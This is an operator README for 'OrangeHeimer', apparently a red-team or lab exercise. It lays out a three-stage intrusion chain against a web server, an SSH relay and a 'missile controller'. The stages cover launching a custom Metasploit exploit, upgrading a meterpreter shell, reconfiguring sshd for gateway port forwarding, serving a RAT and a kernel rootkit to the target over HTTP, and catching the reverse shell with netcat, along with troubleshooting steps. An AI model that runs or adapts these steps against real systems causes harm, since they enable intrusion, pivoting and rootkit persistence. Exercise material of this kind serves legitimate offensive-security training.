# OrangeHeimer
## Network Diagram
![OrangeHeimerNetwerk](https://github.com/user-attachments/assets/d6b00e75-2c73-411a-b7a7-92f11a9e2214)
## Stage 1: Oranco Mining Web Server Exploitation
### Objective
Exploit web server and set up connection to internal relay SSH
### Files:
- orangeland.py
- stage1.rc
### IPs and Ports:
All can be customized in stage1.rc file
- thrower box 10.0.1.21:4444
- oranco Web 10.0.1.1:8443
- thrower SSH 127.0.0.1:22
- relay SSH 172.31.82.221:22
### How to Run:
- run "chmod +x orangeland.py"
- move orangeland.py into metasploit-framework/embedded/framework/modules/exploits/unix/webapp/
- run "msfconsole -r exploit.rc" -- this may need to be run with sudo depending on computer configs
### Possible Failures and Solutions:
Orangeland.py has been tested on multiple ops and should work, if it doesn’t, then verbally harass the analysts.  
If portfwd fails:
- verify that the SSH server is running at the IP and port as indicated, if they are different, re run the portfwd command with -p <SSH_PORT> -r <SSH_IP>
- run "shell" in meterpreter, upgrade using "python3 -c 'import pty; pty.spawn("/bin/bash")'", and verify that the SSH credentials work
- run the portfwd command with a different thrower port using -l <THROW_PORT> Note, this means that all future SSH commands cannot use sshpass and must use -p <THROW_PORT>  
## Stage 2: Setting up Network Communication
### Objective
Set up direct communication between orangeland and device controller using SSH port forwarding
### Files:
- stage2.sh
### IPs and Ports
Can be customized by editing stage2.sh
- thorwer SSH 127.0.0.1:22
- relay SSH 172.31.82.221:22
- thorwer -> controller port forward 127.0.0.1:4200 -> 172.31.86.120:8080
- first relay SSH -> thrower port forward (from controller) 172.100.0.1:4242 -> 127.0.0.1:4201
- second relay SSH -> thrower port forward (from controller) 172.100.0.1:4243 -> 127.0.0.1:4202
### How to Run:
- execute and verify stage 1
- run "./stage2.sh"
- verify success by opening http://localhost:4200 in a web browser, this should return a "Forbidden" page
### Possible Failures and Solutions:
If you cannot SSH into localhost:
- run shell in meterpreter
- upgrade using python3 -c 'import pty; pty.spawn("/bin/bash")'
- SSH into the server with ssh -Nf missileadmin@172.31.81.221
- run SSH reconfiguration commands and verify success
- execute port forwarding commands, using 10.0.1.1 instead of 127.0.0.1
  
If an error occurs in the reconfiguration of the SSH server:
- SSH into the server from localhost
- Check if /etc/ssh/sshd_config has 'GatewayPorts yes' in its last line, if not then sudo su and add it
- Restart ssh service, this can be done with "service ssh restart" or "systemctl restart ssh"
- Continue with normal port forwarding commands

If the commands execute normally, but no response is received from http://localhost:4200
- SSH into the server from localhost
- Run "netstat -plant", check if the output contains a TCP listener on 0.0.0.0:4242
- If the netstat does contain the TCP listener, it indicates that the mastersockets works. Verify that the controller is up and has the correct IP address with the analysts. Then attempt to rerun the first mastersockets command.
- If the netstat has the TCP listener on 127.0.0.1 instead of 0.0.0.0, then the server is not configured properly. Go through the confiugration remediation steps.
- If the netstat has no TCP listener on port 4242, or netstat -plant on the thrower has no open TCP listener on 0.0.0.0:4200, then it is a problem with SSH port forwarding. SSH into the server and determine the issue.  
## Stage 3: Exploiting the Missile Controller
### Files
- orangeRodent
- stage3.py
- dolos_rootkit.ko
### IPs and Ports
Can be edited through changing orangeRodent.c and re-cross-compiling and by editing stage3.py
- thorwer -> controller port forward 127.0.0.1:4200 -> 172.31.86.120:8080
- first relay SSH -> thrower port forward (from controller) 172.100.0.1:4242 -> 127.0.0.1:4201
- second relay SSH -> thrower port forward (from controller) 172.100.0.1:4243 -> 127.0.0.1:4202
### How to Run
- execute and verify stages 1 and 2
- run "python3 -m http.server 4201" in a directory with the orangeRodent and dolos_rootkit.ko to serve the controller the implant 
- run "nc -lv 4202" in a separate terminal to listen for the rat
- run "python3 stage3.py" to throw the exploit
### Possible Failures and Solutions:
If there is no request made to wget:
- Cry
- Verify that the ssh server has proper port forward to thrower box
- Ask the "man on the inside" to examine what is going wrong on the controller
  
If there is a request to wget, but the netcat listener never catches the rat:
- This indicates a problem with the rat
- Run the exploit using the telnet reverse shell which is currently comment out
- Peep around to see what could be wrong
  
If the netcat listener receives the rat, but the rootkit is not up:
- Use rat to examine what is wrong with rootkit
- Fix and recompile the rootkit
- Use rat to send over and install rootkit
